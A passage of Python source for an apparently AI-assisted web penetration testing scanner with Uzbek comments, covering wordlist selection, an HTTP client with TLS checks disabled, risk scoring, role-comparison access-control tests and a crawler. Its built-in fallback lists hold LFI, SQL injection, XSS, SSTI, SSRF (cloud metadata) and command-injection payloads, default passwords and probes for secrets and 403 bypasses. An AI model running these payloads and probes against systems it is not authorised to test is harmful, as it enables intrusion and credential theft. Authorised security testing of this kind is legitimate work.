                          f"{len(empty)} empty: {empty}[/dim]")
            if total == 0:
                console.print(
                    "[dim yellow]  ⚠ No system wordlists found. "
                    "Install: sudo apt install seclists  "
                    "Falling back to built-in minimal payloads.[/dim yellow]"
                )
        return cls._catalog

    @classmethod
    def _scan(cls) -> dict[str, list[str]]:
        catalog: dict[str, list[str]] = {cat: [] for cat in cls.CATEGORY_KEYWORDS}

        for root in cls.SEARCH_ROOTS:
            if not root.exists():
                continue
            for fpath in root.rglob("*.txt"):
                name_lower = fpath.name.lower()
                path_lower = str(fpath).lower()
                for cat, keywords in cls.CATEGORY_KEYWORDS.items():
                    if any(kw in name_lower or kw in path_lower for kw in keywords):
                        catalog[cat].append(str(fpath))
                        break  # bir fayl bir kategoriyaga

        # Ustuvorlik: kichik/medium fayl'lar avval (katta fayl'lar vaqt oladi)
        for cat in catalog:
            catalog[cat].sort(key=lambda p: Path(p).stat().st_size
                              if Path(p).exists() else 0)

        return catalog

    @classmethod
    def best(cls, category: str) -> Optional[str]:
        """Kategoriya uchun eng yaxshi (eng kichik/to'g'ri) wordlist'ni qaytaradi."""
        catalog = cls.get_catalog()
        candidates = catalog.get(category, [])
        for p in candidates:
            if Path(p).exists():
                return p
        return None

    @classmethod
    def summary(cls) -> dict[str, int]:
        """Har kategoriyada nechta wordlist borligini ko'rsatadi."""
        return {cat: len(paths) for cat, paths in cls.get_catalog().items()}


# ─────────────────────────────────────────────────────────────────────────────
# AI WORDLIST SELECTOR — AI sayt ko'rinishiga qarab wordlist tanlaydi
# ─────────────────────────────────────────────────────────────────────────────
class AIWordlistSelector:
    """
    AI sayt texnologiyasi, parametr nomlari, va URL strukturasiga qarab
    tizimda mavjud wordlist'lar ichidan eng mos birini tanlaydi.

    Qanday ishlaydi:
    1. WordlistScanner tizimda mavjud barcha wordlist yo'llarini beradi
    2. AI ularni ko'rib, qaysi biri maqsad uchun eng mos ekanligini tanlaydi
    3. Agar AI tanlay olmasa yoki tizimda yo'q bo'lsa — built-in fallback ishlatiladi
    """

    def __init__(self, ai: "AIEngine"):
        self.ai = ai
        self._cache: dict[str, str] = {}  # (category+context_hash) → path

    def select(self, category: str, context: dict) -> str:
        """
        category: 'lfi' | 'sqli' | 'xss' | 'ssrf' | 'cmdi' | 'dirs' | 'params' | ...
        context: {
            'url': str,
            'param': str,
            'tech': str,          # 'php' | 'java' | 'python' | 'node' | ...
            'param_type': str,    # 'file' | 'id' | 'url' | 'cmd' | ...
            'page_title': str,
            'server': str,        # response header Server:
            'response_snippet': str,
        }

        Returns: mavjud wordlist fayl yo'li yoki fallback /tmp fayl yo'li
        """
        # Cache tekshirish
        ctx_hash = hashlib.md5(
            (category + json.dumps(context, sort_keys=True, default=str)).encode()
        ).hexdigest()[:8]
        cache_key = f"{category}:{ctx_hash}"
        if cache_key in self._cache:
            cached = self._cache[cache_key]
            if Path(cached).exists():
                return cached

        # Tizimda mavjud wordlist'larni olish
        catalog = WordlistScanner.get_catalog()
        candidates = catalog.get(category, [])

        if not candidates:
            # Tizimda bu kategoriya uchun hech nima yo'q — fallback
            return self._make_fallback(category)

        if len(candidates) == 1:
            # Faqat bitta variant — AI'siz qaytarish
            self._cache[cache_key] = candidates[0]
            return candidates[0]

        # Bir nechta variant bor — AI tanlasin
        selected = self._ask_ai(category, candidates, context)

        if selected and Path(selected).exists():
            self._cache[cache_key] = selected
            console.print(f"  [dim cyan]AI wordlist: {Path(selected).name} "
                          f"({category})[/dim cyan]")
            return selected

        # AI tanlay olmadi — birinchi mavjud faylni olish
        for p in candidates:
            if Path(p).exists():
                self._cache[cache_key] = p
                return p

        return self._make_fallback(category)

    def _ask_ai(self, category: str, candidates: list[str],
                context: dict) -> Optional[str]:
        """AI ga kandidatlar ro'yxatini berib, eng mosini so'rash."""
        if not HAS_OLLAMA:
            return None

        # Fayl nomlarini qisqartirish (AI'ga uzoq yo'l kerak emas)
        candidate_names = [
            {"index": i, "name": Path(p).name, "path": p,
             "size_kb": round(Path(p).stat().st_size / 1024) if Path(p).exists() else 0}
            for i, p in enumerate(candidates[:20])  # Max 20 ta ko'rsatish
        ]

        prompt = f"""You are a penetration testing AI. Select the BEST wordlist for the task.

TASK: {category} fuzzing
TARGET URL: {context.get('url', 'unknown')}
PARAMETER: {context.get('param', 'unknown')}
DETECTED TECH: {context.get('tech', 'unknown')}
PARAM TYPE: {context.get('param_type', 'unknown')}
SERVER: {context.get('server', 'unknown')}
PAGE HINTS: {context.get('page_title', '')[:100]}

AVAILABLE WORDLISTS (from this Kali system):
{json.dumps(candidate_names, indent=2)}

Select the single BEST wordlist index for this specific test.
Consider: target tech (PHP needs PHP-specific LFI paths), param name hints, server type.

Respond ONLY with JSON: {{"selected_index": 0, "reason": "brief reason"}}
"""
        try:
            _client = _ollama.Client(host=OLLAMA_HOST)
            resp = _client.chat(
                model=MODEL_NAME,
                messages=[{"role": "user", "content": prompt}],
            )
            raw = resp["message"]["content"]
            clean = re.sub(r'```json|```', '', raw).strip()
            m = re.search(r'\{.*\}', clean, re.DOTALL)
            if m:
                result = json.loads(m.group())
                idx = result.get("selected_index", 0)
                reason = result.get("reason", "")
                if 0 <= idx < len(candidates):
                    console.print(f"  [dim]AI chose wordlist[{idx}]: "
                                  f"{Path(candidates[idx]).name} — {reason[:60]}[/dim]")
                    return candidates[idx]
        except Exception as e:
            console.print(f"[dim red]AIWordlistSelector error: {e}[/dim red]")
        return None

    _fallback_warned: set = set()   # class-level, bir marta ogohlantirish

    def _make_fallback(self, category: str) -> str:
        """Tizimda wordlist topilmasa, built-in minimal list'dan /tmp ga yozadi."""
        BUILTIN_FALLBACKS = {
            "lfi": [
                "../../../../etc/passwd", "../../etc/passwd", "../etc/passwd",
                "/etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252F..%252Fetc%252Fpasswd",
                "../../../../etc/shadow", "../../../../etc/hosts",
                "../../../../windows/win.ini", "../../../../windows/system32/drivers/etc/hosts",
                "C:/Windows/win.ini", "C:\\Windows\\win.ini",
            ],
            "sqli": [
                "'", "''", "1'--", "1 OR 1=1--", "admin'--", "' OR '1'='1",
                "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
                "' UNION SELECT NULL--", "1 AND 1=1", "1 AND 1=2",
                "'; WAITFOR DELAY '0:0:3'--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "';alert(1)//",
                "{{7*7}}", "${7*7}", "#{7*7}",
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                "{{config}}", "{{self.__dict__}}",
                "{% debug %}", "{php}echo 7*7;{/php}",
            ],
            "ssrf": [
                "http://127.0.0.1/", "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data",
                "http://localhost:8080/", "http://0.0.0.0/",
                "file:///etc/passwd", "file:///etc/hosts",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:9200/_cat/indices",
            ],
            "cmdi": [
                "; id", "| id", "` id`", "$(id)", "&& id",
                "; sleep 3", "| sleep 3", "$(sleep 3)",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "|| id", "; whoami",
            ],
            "dirs": [
                "admin", "administrator", "login", "dashboard", "api",
                "backup", "config", ".env", "test", "debug", "uploads",
                "v1", "v2", "graphql", "swagger", "actuator",
                "phpmyadmin", "wp-admin", "console", "health",
            ],
            "params": [
                "id", "user", "name", "token", "key", "page", "limit",
                "file", "path", "url", "redirect", "next", "return",
                "debug", "admin", "role", "type", "action", "cmd",
            ],
            "passwords": [
                "admin", "password", "123456", "admin123", "pass",
                "test", "root", "qwerty", "letmein", "welcome",
            ],
        }
        items = BUILTIN_FALLBACKS.get(category, ["test"])
        path = Path(f"/tmp/pentest_ai_fallback_{category}.txt")
        path.write_text("\n".join(items))
        if category not in AIWordlistSelector._fallback_warned:
            AIWordlistSelector._fallback_warned.add(category)
            console.print(f"  [dim yellow]  ⚠ No system wordlist for '{category}' — "
                          f"using built-in fallback ({len(items)} payloads). "
                          f"Install: sudo apt install seclists[/dim yellow]")
        return str(path)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP CLIENT
# ─────────────────────────────────────────────────────────────────────────────
class HTTPClient:
    def __init__(self, session: SessionContext, timeout: int = DEFAULT_TIMEOUT):
        self.session = session
        self.timeout = timeout
        self._ctx    = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode    = ssl.CERT_NONE
        self._cookie_jar         = http.cookiejar.CookieJar()
        self._opener             = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=self._ctx),
            urllib.request.HTTPCookieProcessor(self._cookie_jar),
        )

    def _build_headers(self, extra: dict = None) -> dict:
        h = {
            "User-Agent": DEFAULT_UA,
            "Accept":     "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if self.session.cookies:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session.cookies.items())
        if self.session.jwt_token:
            h["Authorization"] = f"Bearer {self.session.jwt_token}"
        if self.session.csrf_token:
            h["X-CSRFToken"] = self.session.csrf_token
            h["X-XSRF-Token"] = self.session.csrf_token
        if self.session.headers:
            h.update(self.session.headers)
        if extra:
            h.update(extra)
        return h

    def get(self, url: str, extra_headers: dict = None) -> dict:
        return self._request(url, "GET", headers=extra_headers)

    def post(self, url: str, data: Any = None, json_data: dict = None,
             extra_headers: dict = None) -> dict:
        body, ct = b"", "application/x-www-form-urlencoded"
        if json_data is not None:
            body = json.dumps(json_data).encode()
            ct   = "application/json"
        elif isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
        elif isinstance(data, (str, bytes)):
            body = data.encode() if isinstance(data, str) else data
        h = {"Content-Type": ct}
        if extra_headers:
            h.update(extra_headers)
        return self._request(url, "POST", body=body, headers=h)

    def _request(self, url: str, method: str, body: bytes = None,
                 headers: dict = None) -> dict:
        h   = self._build_headers(headers)
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        t0  = time.time()
        try:
            with self._opener.open(req, timeout=self.timeout) as r:
                raw       = r.read(200_000)
                timing    = time.time() - t0
                resp_body = raw.decode("utf-8", errors="replace")
                resp_hdrs = dict(r.headers)
                for c in self._cookie_jar:
                    self.session.cookies[c.name] = c.value
                return {
                    "ok": True, "status": r.status, "url": r.url,
                    "headers": resp_hdrs, "body": resp_body,
                    "timing": round(timing, 3), "error": None,
                }
        except urllib.error.HTTPError as e:
            timing    = time.time() - t0
            resp_body = e.read(50_000).decode("utf-8", errors="replace") if e.fp else ""
            return {
                "ok": False, "status": e.code, "url": url,
                "headers": dict(e.headers) if e.headers else {},
                "body": resp_body, "timing": round(timing, 3), "error": str(e),
            }
        except Exception as e:
            return {
                "ok": False, "status": 0, "url": url,
                "headers": {}, "body": "", "timing": 0.0, "error": str(e),
            }


# ─────────────────────────────────────────────────────────────────────────────
# RISK SCORER
# ─────────────────────────────────────────────────────────────────────────────
class RiskScorer:
    HIGH_RISK_KEYWORDS = [
        "admin", "administrator", "superuser", "root",
        "config", "configuration", "settings", "setup",
        "backup", "bak", "old", "archive", "dump",
        "debug", "test", "dev", "development", "staging",
        "env", "environment", ".env",
        "internal", "private", "secret", "hidden",
        "api", "v1", "v2", "v3", "graphql",
        "upload", "file", "import", "export",
        "reset", "forgot", "password", "token",
        "template", "shell", "exec", "cmd", "command",
        "install", "setup", "wizard", "migrate",
        "swagger", "openapi", "redoc", "docs",
        "actuator", "metrics", "health", "status",
        "phpmyadmin", "adminer", "cpanel", "webmin",
    ]
    SENSITIVE_BODY_KEYS = [
        "db_host", "db_pass", "database_url", "redis",
        "api_key", "api_secret", "secret_key", "private_key",
        "smtp", "mail_pass", "aws_access", "aws_secret",
        "jwt_secret", "jwt_key", "app_secret",
        "debug", "debug_mode", "app_debug",
        "password", "passwd", "credentials",
        "connection_string", "mongo_uri", "postgres_url",
    ]

    @classmethod
    def score_url(cls, url: str) -> int:
        path  = urllib.parse.urlparse(url).path.lower()
        score = 0
        for kw in cls.HIGH_RISK_KEYWORDS:
            if kw in path:
                score += 15
        if any(path.endswith(e) for e in [".bak",".sql",".zip",".tar",".gz",".log",".env",".cfg",".conf",".ini",".xml",".json"]):
            score += 25
        if re.search(r'/\d+(?:/|$)', path):
            score += 10
        return min(score, 100)

    @classmethod
    def score_body(cls, body: str) -> list[dict]:
        findings = []
        body_l = body.lower()
        for key in cls.SENSITIVE_BODY_KEYS:
            pattern = rf'["\']?{re.escape(key)}["\']?\s*[:=]\s*["\']?([^\s"\'<>{{}}]+)'
            m = re.search(pattern, body_l)
            if m:
                findings.append({
                    "key":   key,
                    "value": m.group(1)[:60],
                    "risk":  "Critical" if key in ("db_pass","api_secret","jwt_secret","private_key","aws_secret") else "High",
                })
        return findings

    @classmethod
    def detect_tech(cls, resp: dict) -> dict:
        """
        Response'dan texnologiya stack'ini aniqlaydi.
        Bu ma'lumot AI wordlist tanlash uchun ishlatiladi.
        """
        tech = {"lang": "unknown", "server": "unknown", "framework": "unknown", "cms": "unknown"}
        headers = resp.get("headers", {})
        body    = resp.get("body", "")[:3000]

        # Server header
        server = headers.get("server", headers.get("Server", ""))
        tech["server"] = server[:40] if server else "unknown"

        # Dasturlash tili — header'lardan
        powered_by = headers.get("x-powered-by", headers.get("X-Powered-By", ""))
        if "PHP" in powered_by:
            tech["lang"] = "php"
        elif "ASP.NET" in powered_by:
            tech["lang"] = "aspnet"
        elif "Express" in powered_by or "Node" in powered_by:
            tech["lang"] = "nodejs"

        # Body'dan aniqlash
        body_lower = body.lower()
        if tech["lang"] == "unknown":
            if ".php" in body_lower or "<?php" in body_lower:
                tech["lang"] = "php"
            elif ".asp" in body_lower or ".aspx" in body_lower:
                tech["lang"] = "aspnet"
            elif "wp-content" in body_lower or "wordpress" in body_lower:
                tech["lang"] = "php"
                tech["cms"] = "wordpress"
            elif "joomla" in body_lower:
                tech["lang"] = "php"
                tech["cms"] = "joomla"
            elif "drupal" in body_lower:
                tech["lang"] = "php"
                tech["cms"] = "drupal"
            elif "django" in body_lower or "csrfmiddlewaretoken" in body_lower:
                tech["lang"] = "python"
                tech["framework"] = "django"
            elif "rails" in body_lower or "authenticity_token" in body_lower:
                tech["lang"] = "ruby"
                tech["framework"] = "rails"
            elif "laravel" in body_lower or "x-laravel" in powered_by.lower():
                tech["lang"] = "php"
                tech["framework"] = "laravel"
            elif "spring" in body_lower or "actuator" in body_lower:
                tech["lang"] = "java"
                tech["framework"] = "spring"

        # Server'dan aniqlash
        if "nginx" in server.lower():
            tech["server"] = "nginx"
        elif "apache" in server.lower():
            tech["server"] = "apache"
        elif "iis" in server.lower():
            tech["server"] = "iis"
            if tech["lang"] == "unknown":
                tech["lang"] = "aspnet"
        elif "tomcat" in server.lower():
            tech["server"] = "tomcat"
            if tech["lang"] == "unknown":
                tech["lang"] = "java"

        return tech


# ─────────────────────────────────────────────────────────────────────────────
# SESSION MANAGER
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class RoleContext:
    name:      str
    client:    "HTTPClient"
    session:   SessionContext
    logged_in: bool = False

class SessionManager:
    def __init__(self, base_client: HTTPClient, ai: "AIEngine"):
        self.base_client = base_client
        self.ai          = ai
        self.roles       : dict[str, RoleContext] = {
            "anonymous": RoleContext(
                name="anonymous",
                client=base_client,
                session=base_client.session,
            )
        }

    def add_role(self, name: str, login_url: str, username: str, password: str) -> bool:
        new_session = SessionContext()
        new_client  = HTTPClient(new_session, timeout=DEFAULT_TIMEOUT)
        success     = self._do_login(new_client, login_url, username, password)
        self.roles[name] = RoleContext(
            name=name, client=new_client,
            session=new_session, logged_in=success,
        )
        if success:
            console.print(f"[green]✓ Role '{name}' logged in as {username}[/green]")
        return success

    def add_role_by_cookies(self, name: str, cookies: dict, headers: dict = None, jwt: str = ""):
        new_session = SessionContext(
            cookies=cookies,
            headers=headers or {},
            jwt_token=jwt,
            role=name,
            logged_in=True,
        )
        new_client = HTTPClient(new_session, timeout=DEFAULT_TIMEOUT)
        self.roles[name] = RoleContext(
            name=name, client=new_client,
            session=new_session, logged_in=True,
        )
        console.print(f"[green]✓ Role '{name}' added via cookies[/green]")

    def compare_endpoint(self, url: str, method: str = "GET", data: dict = None) -> dict:
        results = {}
        for role_name, ctx in self.roles.items():
            if method == "GET":
                r = ctx.client.get(url)
            else:
                r = ctx.client.post(url, data=data or {})
            results[role_name] = {
                "status":     r["status"],
                "size":       len(r["body"]),
                "title":      self._extract_title(r["body"]),
                "body_hash":  hashlib.md5(r["body"].encode()).hexdigest(),
                "body_snippet": r["body"][:300],
                "has_sensitive": bool(RiskScorer.score_body(r["body"])),
            }
        return results

    def detect_bac(self, url: str, method: str = "GET", data: dict = None) -> Optional[dict]:
        if len(self.roles) < 2:
            return None
        responses  = self.compare_endpoint(url, method, data)
        role_list  = list(responses.items())
        comparisons = []
        for i in range(len(role_list)):
            for j in range(i+1, len(role_list)):
                r1_name, r1 = role_list[i]
                r2_name, r2 = role_list[j]
                if r1["status"] == 0 or r2["status"] == 0:
                    continue
                same_hash  = r1["body_hash"] == r2["body_hash"]
                same_size  = abs(r1["size"] - r2["size"]) < 50
                both_200   = r1["status"] == 200 and r2["status"] == 200
                diff_roles = r1_name != r2_name
                if both_200 and (same_hash or same_size) and diff_roles:
                    comparisons.append({
                        "role_a": r1_name, "role_b": r2_name,
                        "signal": "same_response_different_roles",
                        "size_a": r1["size"], "size_b": r2["size"],
                        "status_a": r1["status"], "status_b": r2["status"],
                    })
                if r1_name == "anonymous" and r2_name != "anonymous":
                    if r1["status"] == 200 and r2["status"] == 200:
                        comparisons.append({
                            "role_a": "anonymous", "role_b": r2_name,
                            "signal": "anonymous_access_to_auth_endpoint",
                            "status_a": r1["status"], "status_b": r2["status"],
                        })
        if comparisons:
            return {"url": url, "method": method, "responses": responses, "comparisons": comparisons}
        return None

    def _do_login(self, client: HTTPClient, login_url: str,
                  username: str, password: str) -> bool:
        resp      = client.get(login_url)
        if resp["status"] == 0:
            return False
        csrf      = self._extract_csrf(resp["body"])
        field_map = self.ai.identify_login_fields(resp["body"], login_url)
        payload   = {
            field_map.get("username_field", "username"): username,
            field_map.get("password_field", "password"): password,
        }
        if csrf:
            payload[field_map.get("csrf_field", "csrf_token")] = csrf
        resp2 = client.post(login_url, data=payload)
        return self._check_login_success(resp2, username)

    def _extract_csrf(self, body: str) -> str:
        patterns = [
            r'<input[^>]+name=["\'](?:csrf[_-]?token|_token|csrfmiddlewaretoken|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
            r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
            r'"csrf_?[Tt]oken"\s*:\s*"([^"]+)"',
        ]
        for p in patterns:
            m = re.search(p, body, re.I)
            if m:
                return m.group(1)
        return ""

    def _check_login_success(self, resp: dict, username: str) -> bool:
        if resp["status"] in (301, 302):
            loc = resp["headers"].get("location", "")
            return not any(x in loc.lower() for x in ["/login","/signin","/error"])
        body = resp["body"].lower()
        if any(s in body for s in ["invalid password","login failed","wrong password","invalid credentials"]):
            return False
        if any(s in body for s in ["dashboard","welcome","logout","profile",username.lower()]):
            return True
        return resp["status"] == 200

    def _extract_title(self, body: str) -> str:
        m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
        return m.group(1).strip()[:80] if m else ""


# ─────────────────────────────────────────────────────────────────────────────
# CRAWLER
# ─────────────────────────────────────────────────────────────────────────────
class Crawler:
    def __init__(self, client: HTTPClient, ai: "AIEngine", base_url: str):
        self.client         = client
        self.ai             = ai
        self.base           = base_url
        self.base_host      = urllib.parse.urlparse(base_url).netloc
        self.visited        : set            = set()
        self.endpoints      : list[Endpoint] = []
        self.forbidden_paths: set            = set()
        self.acl_bypass_findings: list       = []
        self.auth_wall_pages    : list       = []
        self._lock          = threading.Lock()
        self._q             : queue.Queue    = queue.Queue()
        self._scorer        = RiskScorer()
        # Sayt texnologiyasini saqlash (wordlist tanlash uchun)
        self.site_tech      : dict           = {}

    def crawl(self, max_depth: int = MAX_CRAWL_DEPTH) -> list[Endpoint]:
        console.print(f"\n[bold cyan]━━ CRAWLER STARTED ━━[/bold cyan]")
        self._probe_well_known()
        self._q.put((self.base, 0))
        threads = []
        for _ in range(min(MAX_WORKERS, 4)):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
            threads.append(t)
        self._q.join()
        console.print(f"[dim]  Found {len(self.forbidden_paths)} restricted paths → probing bypasses...[/dim]")
        self._probe_forbidden_children()
        console.print(f"[green]✓ Crawl done — {len(self.endpoints)} endpoints, "
                      f"{len(self.forbidden_paths)} forbidden paths, "
                      f"{len(self.acl_bypass_findings)} bypass candidates[/green]")
        return self.endpoints

    def _probe_well_known(self):
        base = self.base.rstrip("/")
        well_known = [
            "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
            "/.well-known/security.txt", "/.well-known/openid-configuration",
            "/swagger.json", "/swagger/v1/swagger.json", "/openapi.json",
            "/api-docs", "/api/docs", "/v1/api-docs", "/v2/api-docs",
            "/graphql", "/graphiql", "/__graphql",
            "/swagger-ui.html", "/redoc",
            "/.env", "/.env.local", "/.env.production", "/.env.backup",
            "/config.php", "/config.json", "/config.yaml", "/config.yml",
            "/web.config", "/app.config", "/appsettings.json",
            "/application.properties", "/application.yml",
            "/phpinfo.php", "/info.php", "/test.php",
            "/backup.zip", "/backup.sql", "/backup.tar.gz",
            "/db.sql", "/database.sql", "/dump.sql",
            "/.git/HEAD", "/.git/config", "/.svn/entries",
            "/wp-config.php", "/wp-config.php.bak",
            "/debug", "/debug/vars", "/debug/pprof",
            "/actuator", "/actuator/env", "/actuator/health",
            "/actuator/mappings", "/actuator/beans",
            "/metrics", "/health", "/status", "/ping",
            "/console", "/h2-console",
            "/admin", "/administrator", "/admin/login",
            "/phpmyadmin", "/adminer.php", "/cpanel",
            "/error.log", "/access.log", "/debug.log",
            "/logs/error.log", "/storage/logs/laravel.log",
        ]
        console.print(f"[dim]  Probing {len(well_known)} well-known paths...[/dim]")

        # Asosiy sahifani texnologiya aniqlash uchun olish
        root_resp = self.client.get(base)
        if root_resp["status"] != 0:
            self.site_tech = RiskScorer.detect_tech(root_resp)
            console.print(f"[dim]  Detected tech: {self.site_tech}[/dim]")

        for path in well_known:
            url = base + path
            if url in self.visited:
                continue
            r = self.client.get(url)
            if r["status"] == 0:
                continue
            with self._lock:
                self.visited.add(url)

            # Tech detection — har response'dan yangilash
            if not self.site_tech.get("lang") or self.site_tech.get("lang") == "unknown":
                detected = RiskScorer.detect_tech(r)
                if detected.get("lang") != "unknown":
                    self.site_tech.update(detected)

            status = r["status"]
            body   = r["body"]
            parsed_path = urllib.parse.urlparse(url).path

            body_lower = body.lower()
            auth_signals = ["login required","please log in","not authorized",
                            "you do not have access","access denied","unauthorized",
                            "permission denied","members only","sign in"]
            is_auth_wall = any(s in body_lower for s in auth_signals)
            title_m   = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
            page_title = title_m.group(1).strip() if title_m else ""
            is_soft_404 = status in (404, 200) and len(body) > 150 and page_title

            if status == 403:
                self.forbidden_paths.add(parsed_path)
                console.print(f"  [yellow]🔒 403 {url}[/yellow] [dim]— added to bypass queue[/dim]")
            elif status in (401, 302):
                self.forbidden_paths.add(parsed_path)
                self.auth_wall_pages.append({
                    "url": url, "status": status,
                    "title": page_title, "body_snippet": body[:400],
                    "signal": f"HTTP {status}",
                })
                console.print(f"  [yellow]🔐 {status} {url}[/yellow] [dim]— auth redirect[/dim]")
            elif is_auth_wall and not (status == 404 and is_soft_404):
                self.forbidden_paths.add(parsed_path)
                self.auth_wall_pages.append({
                    "url": url, "status": status,
                    "title": page_title, "body_snippet": body[:400],
                    "signal": next(s for s in auth_signals if s in body_lower),
                })
            elif is_soft_404 and status == 404:
                # custom_404_branded: SPA/Flask saytlar 404 URL'larga login
                # sahifasini 200 bilan qaytaradi — bu BAC emas, soft-404.
                # auth_wall_pages ga QOSHILMAYDI — BAC probe bekor.
                console.print(f"  [dim]  ⚙ soft-404 (custom branded): {url} — no BAC probe[/dim]")

            if status in (200, 206):
                ep = self._url_to_endpoint(url, "GET", 0, "well_known")
                ep.score = RiskScorer.score_url(url) + 20
                with self._lock:
                    self.endpoints.append(ep)
                console.print(f"  [green]✓ {status} {url}[/green] [dim]({len(body)} bytes)[/dim]")
                if path == "/robots.txt":
                    self._parse_robots(body, base)
                elif "sitemap" in path:
                    self._parse_sitemap(body, base)

    def _parse_robots(self, body: str, base: str):
        for m in re.finditer(r'(?:Disallow|Allow):\s*(/\S*)', body, re.I):
            path = m.group(1).split("*")[0].rstrip("/")
            if path and len(path) > 1:
                url = base + path
                if url not in self.visited:
                    self._q.put((url, 1))
        for m in re.finditer(r'Sitemap:\s*(\S+)', body, re.I):
            self._q.put((m.group(1), 1))

    def _parse_sitemap(self, body: str, base: str):
        urls = re.findall(r'<loc>(.*?)</loc>', body, re.I)
        for url in urls[:100]:
            url = url.strip()
            if self._same_host(url) and url not in self.visited:
                self._q.put((url, 1))

    def _probe_forbidden_children(self):
        if not self.forbidden_paths:
            return
        console.print(f"[dim]  Probing children of {len(self.forbidden_paths)} forbidden paths...[/dim]")
        suffixes = [
            "/", "/index", "/index.php", "/index.html",
            "/list", "/get", "/info", "/view", "/show",
            "/api", "/data", "/export", "/backup",
            "/config", "/settings", "/users", "/logs",
            "/template", "/templates", "/edit", "/update", "/delete",
            "/dashboard", "/panel", "/manage", "/management",
            "/report", "/reports", "/upload", "/uploads",
            "/secret", "/private", "/internal", "/debug",
            "/env", "/vars", "/config.json", "/config.php",
            "/../", "/%2e%2e/", "/.;/", "//",
            "?debug=true", "?test=1", "?admin=1", "?show=1",
        ]
        nested_suffixes = [
            "/template", "/templates", "/list", "/view",
            "/config", "/settings", "/edit", "/show",
            "/get", "/info", "/data", "/export",
        ]
        base = self.base.rstrip("/")
        for fpath in list(self.forbidden_paths):
            for suffix in suffixes:
                url = base + fpath + suffix
                if url in self.visited:
                    continue
                r = self.client.get(url)
                with self._lock:
                    self.visited.add(url)
                if r["status"] in (200, 201, 202):
                    ep = self._url_to_endpoint(url, "GET", 0, "forbidden_child")
                    ep.score = 90
                    with self._lock:
                        self.endpoints.append(ep)
                    console.print(f"  [bold red]🚨 403→200 {url}[/bold red]")
                    self.acl_bypass_findings.append({
                        "parent_403": base + fpath,
                        "child_200": url,
                        "body_size": len(r["body"]),
                        "body_snippet": r["body"][:300],
                    })
                    for nsuffix in nested_suffixes:
                        nurl = url.rstrip("/") + nsuffix
                        if nurl in self.visited:
                            continue
                        nr = self.client.get(nurl)
                        with self._lock:
                            self.visited.add(nurl)
                        if nr["status"] in (200, 201, 202):
                            nep = self._url_to_endpoint(nurl, "GET", 0, "forbidden_child_deep")
                            nep.score = 95
                            with self._lock:
                                self.endpoints.append(nep)
                            self.acl_bypass_findings.append({
                                "parent_403": base + fpath,
                                "child_200": nurl,
                                "body_size": len(nr["body"]),
                                "body_snippet": nr["body"][:300],
                            })
                elif r["status"] == 403:
                    child_path = urllib.parse.urlparse(url).path
                    with self._lock:
                        self.forbidden_paths.add(child_path)

    def _worker(self):
        while True:
            try:
                url, depth = self._q.get(timeout=3)
            except queue.Empty:
                break
            try:
                self._process(url, depth)
            except Exception:
                pass
            finally:
                self._q.task_done()

    def _process(self, url: str, depth: int):
        with self._lock:
            if url in self.visited or len(self.visited) >= MAX_URLS:
                return
            self.visited.add(url)
        resp  = self.client.get(url)
        if resp["status"] == 0:
            return
        status = resp["status"]
        body   = resp["body"]

        # Tech yangilash
        if self.site_tech.get("lang") in (None, "unknown"):
            detected = RiskScorer.detect_tech(resp)
            if detected.get("lang") != "unknown":
                with self._lock:
                    self.site_tech.update(detected)

        if status in (403, 401):
            parsed_path = urllib.parse.urlparse(url).path
            with self._lock:
                self.forbidden_paths.add(parsed_path)
        elif status == 302:
            loc = resp["headers"].get("location", "").lower()
            if any(x in loc for x in ["/login", "/signin", "/auth"]):
                parsed_path = urllib.parse.urlparse(url).path
                with self._lock:
                    self.forbidden_paths.add(parsed_path)

        body_lower = body.lower()[:1000]
        AUTH_SIGNALS = [
            "login required", "please log in", "please login",
            "you must be logged in", "authentication required",
            "you do not have access", "access denied", "not authorized",
            "unauthorized", "permission denied", "members only",
            "sign in to continue", "session expired",
        ]
        is_auth_wall = any(sig in body_lower for sig in AUTH_SIGNALS)
        title_m = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
        page_title = title_m.group(1).strip()[:120] if title_m else ""
        is_soft_404 = status == 404 and len(body) > 150 and bool(page_title)

        ep       = self._url_to_endpoint(url, "GET", depth, "crawler")
        ep.score = RiskScorer.score_url(url)

        if is_auth_wall and not is_soft_404:
            ep.score += 40
            parsed_path = urllib.parse.urlparse(url).path
            with self._lock:
                self.forbidden_paths.add(parsed_path)
            self.auth_wall_pages.append({
                "url": url, "status": status,
                "title": page_title, "body_snippet": body[:400],
                "signal": next(s for s in AUTH_SIGNALS if s in body_lower),
            })

        sens = RiskScorer.score_body(body)
        if sens:
            ep.score += 30

        with self._lock:
            self.endpoints.append(ep)

        if depth >= MAX_CRAWL_DEPTH:
            return

        for link in self._extract_links(body, url):
            with self._lock:
                if link not in self.visited and len(self.visited) < MAX_URLS:
                    self._q.put((link, depth + 1))

        for form_ep in self._extract_forms(body, url):
            with self._lock:
                self.endpoints.append(form_ep)

        all_js = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S | re.I)
